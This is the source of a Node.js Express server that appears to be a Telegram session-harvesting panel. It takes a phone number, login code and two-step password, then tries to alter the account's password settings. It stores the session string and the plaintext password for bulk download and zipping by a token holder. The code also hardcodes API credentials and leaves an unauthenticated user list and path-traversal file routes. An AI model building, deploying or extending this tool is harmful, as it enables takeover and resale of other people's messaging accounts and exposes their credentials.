const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const archiver = require('archiver');
const { TelegramClient } = require("telegram");
const { StringSession } = require("telegram/sessions");
const { Api } = require("telegram/tl");

// Telegram API credentials
const apiId = 29176644;
const apiHash = "779da7ab84c393d0bec09d1be3918dec";

// Express app
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.static('public'));
app.use(bodyParser.json({ limit: "10mb" }));
app.use(bodyParser.urlencoded({ extended: true }));

// Serve HTML file
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Bot start
require("./bot");

// Base storage - auto create
const BASE = path.join(__dirname, "sessionStore");
if (!fs.existsSync(BASE)) fs.mkdirSync(BASE);

// Files for data storage - auto create
const USERS_FILE = path.join(__dirname, 'users.json');
const USED_PHONES_FILE = path.join(__dirname, 'usedPhones.json');

// Ensure files exist
if (!fs.existsSync(USERS_FILE)) fs.writeFileSync(USERS_FILE, '[]');
if (!fs.existsSync(USED_PHONES_FILE)) fs.writeFileSync(USED_PHONES_FILE, '[]');

// Load users
function loadUsers() {
    try {
        const data = fs.readFileSync(USERS_FILE, 'utf8');
        return JSON.parse(data) || [];
    } catch (e) {
        return [];
    }
}

// Save users
function saveUsers(users) {
    fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2), 'utf8');
}

// Load used phones
function loadUsedPhones() {
    try {
        const data = fs.readFileSync(USED_PHONES_FILE, 'utf8');
        return JSON.parse(data) || [];
    } catch (e) {
        return [];
    }
}

// Save used phones
function saveUsedPhones(phones) {
    fs.writeFileSync(USED_PHONES_FILE, JSON.stringify(phones, null, 2), 'utf8');
}

// Check if phone is used
function isPhoneUsed(phone) {
    const phones = loadUsedPhones();
    return phones.includes(phone);
}

// Mark phone as used
function markPhoneUsed(phone) {
    const phones = loadUsedPhones();
    if (!phones.includes(phone)) {
        phones.push(phone);
        saveUsedPhones(phones);
    }
}

// User folder
function getUserFolder(token) {
    const safe = token.replace(/[^a-zA-Z0-9_-]/g, "_");
    const folder = path.join(BASE, safe);
    if (!fs.existsSync(folder)) fs.mkdirSync(folder, { recursive: true });
    return folder;
}

// OTP temp storage
let temp = {};

// Load country proxies
function loadCountryProxies() {
    try {
        const data = fs.readFileSync(path.join(__dirname, 'countryProxies.json'), 'utf-8');
        return JSON.parse(data);
    } catch (e) {
        return {};
    }
}

// Get country code from number
function getCountryCodeFromNumber(number) {
    const match = number.match(/^\+?(\d{1,3})/);
    if (!match) return null;
    const code = match[1];
    switch (code) {
        case "880": return "BD";
        case "91": return "IN";
        case "1": return "US";
        case "31": return "NL";
        case "65": return "SP";
        case "27": return "SA";
        default: return null;
    }
}

// ------------ ROUTES ------------

// Create new user
app.post('/newuser', (req, res) => {
    const { username, token } = req.body;
    if (!username || !token) return res.json({ ok: false, error: 'Missing username or token' });

    const users = loadUsers();
    const exists = users.find(u => u.username.toLowerCase() === username.toLowerCase());
    if (exists) return res.json({ ok: false, error: 'Username already exists' });

    users.push({ username, token, createdAt: new Date().toISOString() });
    saveUsers(users);
    res.json({ ok: true, message: 'User created successfully' });
});

// Send OTP
app.post("/sendOtp", async (req, res) => {
    const { countryCode, token } = req.body;
    const phone = countryCode + req.body.phone;

    if (!phone || !token || !countryCode) {
        return res.json({ ok: false, error: "Phone/token/countryCode required" });
    }

    // Check if phone already used
    if (isPhoneUsed(phone)) {
        return res.json({ ok: false, error: "ALREADY_USED", message: "এই নম্বরটি ইতিমধ্যে ব্যবহার করা হয়েছে।" });
    }

    const countryProxies = loadCountryProxies();
    const country = getCountryCodeFromNumber(countryCode);
    const proxy = countryProxies[country] || {};

    let clientConfig = {
        connectionRetries: 5,
        deviceModel: "Samsung Galaxy S23",
        systemVersion: "Android 13",
        appVersion: "12.2.10",
        langCode: "en"
    };

    if (proxy.port) {
        clientConfig.proxy = proxy;
    }

    try {
        const session = new StringSession("");
        const client = new TelegramClient(session, apiId, apiHash, clientConfig);

        client._connection._timeout = 60000;
        client._timeout = 60000;
        client.setLogLevel("none");

        await client.connect();

        // Auto disconnect after 2 minutes
        setTimeout(() => {
            try { client.disconnect(); } catch { }
        }, 120000);

        const sent = await client.invoke(
            new Api.auth.SendCode({
                phoneNumber: phone,
                apiId,
                apiHash,
                settings: new Api.CodeSettings({
                    allow_flashcall: false,
                    current_number: false,
                    allow_app_hash: true,
                }),
            })
        );

        temp[phone] = { client, session, hash: sent.phoneCodeHash, time: Date.now() };
        return res.json({ ok: true, message: "OTP sent successfully", status: "PROCESSING" });
    } catch (err) {
        return res.json({ ok: false, error: err.message, status: "ERROR" });
    }
});

// Verify OTP
app.post("/verify", async (req, res) => {
    const { phone, code, password, token } = req.body;
    if (!temp[phone]) return res.json({ ok: false, error: "Session expired", status: "TIMEOUT" });

    const { client, session, hash, time } = temp[phone];

    // OTP timeout: 3 minutes
    if (Date.now() - time > 180000) {
        try { client.disconnect(); } catch { }
        delete temp[phone];
        return res.json({ ok: false, error: "OTP timeout expired", status: "TIMEOUT" });
    }

    try {
        let result;
        try {
            result = await client.invoke(
                new Api.auth.SignIn({
                    phoneNumber: phone,
                    phoneCode: code,
                    phoneCodeHash: hash,
                })
            );
        } catch (err) {
            if (err.errorMessage === "SESSION_PASSWORD_NEEDED") {
                if (!password) {
                    return res.json({ ok: false, error: "2FA_PASSWORD_REQUIRED", status: "2FA_NEEDED" });
                }
                result = await client.invoke(
                    new Api.auth.CheckPassword({ password })
                );
            } else {
                throw err;
            }
        }

        // Auto enable 2FA
        try {
            await client.invoke(
                new Api.account.UpdatePasswordSettings({
                    password: password || "",
                    newSettings: new Api.account.PasswordInputSettings({
                        newAlgo: new Api.PasswordKdfAlgoSHA256SHA256PBKDF2HMACSHA512iter100000SHA256ModPow({
                            salt1: Buffer.alloc(8),
                            salt2: Buffer.alloc(8),
                            g: 2,
                            p: Buffer.alloc(256),
                        }),
                        newPasswordHash: Buffer.alloc(0),
                        hint: "Enabled by Session Manager",
                        email: "",
                        newSecureSettings: undefined,
                    }),
                })
            );
        } catch { }

        const userFolder = getUserFolder(token);
        const fileName = "session_" + Date.now() + ".txt";
        const filePath = path.join(userFolder, fileName);

        const sessionData = {
            sessionString: session.save(),
            phone: phone,
            timestamp: Date.now(),
            has2FA: !!password,
            twoFAPassword: password || null
        };

        fs.writeFileSync(filePath, JSON.stringify(sessionData, null, 2));
        markPhoneUsed(phone);

        try { client.disconnect(); } catch { }
        delete temp[phone];

        return res.json({
            ok: true,
            file: fileName,
            message: "Session created with 2FA enabled",
            status: "VERIFIED"
        });
    } catch (err) {
        return res.json({ ok: false, error: err.message, status: "ERROR" });
    }
});

// Get session list
app.get("/sessionList", (req, res) => {
    const token = req.query.token;
    const folder = getUserFolder(token);

    if (!fs.existsSync(folder)) {
        return res.json([]);
    }

    const files = fs.readdirSync(folder)
        .filter(f => f.endsWith('.txt'))
        .map(f => {
            const stats = fs.statSync(path.join(folder, f));
            try {
                const content = JSON.parse(fs.readFileSync(path.join(folder, f), 'utf8'));
                return {
                    name: f,
                    size: stats.size,
                    phone: content.phone || 'Unknown',
                    has2FA: content.has2FA || false,
                    timestamp: content.timestamp || stats.mtimeMs
                };
            } catch {
                return {
                    name: f,
                    size: stats.size,
                    phone: 'Unknown',
                    has2FA: false,
                    timestamp: stats.mtimeMs
                };
            }
        });

    res.json(files);
});

// View session
app.get("/view/:file", (req, res) => {
    const token = req.query.token;
    const folder = getUserFolder(token);
    const filePath = path.join(folder, req.params.file);
    
    if (!fs.existsSync(filePath)) {
        return res.status(404).send("File not found");
    }

    try {
        const content = fs.readFileSync(filePath, 'utf8');
        const parsed = JSON.parse(content);
        res.json(parsed);
    } catch {
        res.sendFile(filePath);
    }
});

// Download session
app.get("/download/:file", (req, res) => {
    const token = req.query.token;
    const folder = getUserFolder(token);
    const filePath = path.join(folder, req.params.file);
    
    if (!fs.existsSync(filePath)) {
        return res.status(404).send("File not found");
    }
    res.download(filePath);
});

// Zip sessions
app.post("/zip", (req, res) => {
    const { token, files } = req.body;
    const folder = getUserFolder(token);

    res.setHeader("Content-Type", "application/zip");
    res.setHeader("Content-Disposition", "attachment; filename=sessions.zip");

    const archive = archiver("zip");
    archive.pipe(res);

    files.forEach(f => {
        const fp = path.join(folder, f);
        if (fs.existsSync(fp)) {
            archive.file(fp, { name: f });
        }
    });

    archive.finalize();
});

// Check phone
app.post("/checkPhone", (req, res) => {
    const { phone } = req.body;
    if (!phone) return res.json({ ok: false, error: "Phone required" });
    
    const isUsed = isPhoneUsed(phone);
    res.json({ ok: true, isUsed });
});

// Get all users (admin)
app.get('/users', (req, res) => {
    const users = loadUsers();
    res.json(users);
});

// Start server
app.listen(PORT, () => {
    console.log(`✅ Server running → http://localhost:${PORT}`);
});
